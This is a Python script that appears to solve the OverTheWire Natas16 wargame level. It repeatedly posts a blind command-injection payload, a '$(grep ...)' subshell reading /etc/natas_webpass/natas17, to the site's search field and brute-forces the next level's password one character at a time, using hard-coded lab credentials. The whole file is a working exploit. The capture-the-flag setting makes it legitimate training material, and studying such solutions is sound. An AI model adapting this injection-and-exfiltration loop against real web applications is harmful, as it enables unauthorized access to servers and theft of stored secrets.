import requests

# Define the characters that may appear in the password
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"

# Credentials for natas16
username = "natas16"
password = "hPkjKYviLQctEW33QmuXL6eDVfMW4sGo"

# Target URL
url = "http://natas16.natas.labs.overthewire.org"

# Start a session to persist cookies and headers across requests
session = requests.Session()

# This will store the discovered password characters
current_password = []

# Stop when full password 32 character long is discovered
while len(current_password) < 32:
    for character in characters:
        # Build the current guess
        guess = "".join(current_password) + character
        # print(f"Guessing with: {guess}") #verbose mode

        # Command Injection Payload:
        # $(grep ^character.* /etc/natas_webpass/natas17)zeros 
        payload = f'$(grep ^{guess}.* /etc/natas_webpass/natas17)zeros'

        # Send POST request with command injection payload
        response = session.post(
            url,
            data={"needle": payload},
            auth=(username, password)
        )

        # Check for success message in the response
        if "zeros" not in response.text:
            current_password.append(character)  # Correct character found
            print("brute-forcing progress: " + "".join(current_password)) # printing progress
            break  # Go to the next character in the password


# Print the discovered password
print("Password Found: " + "".join(current_password))
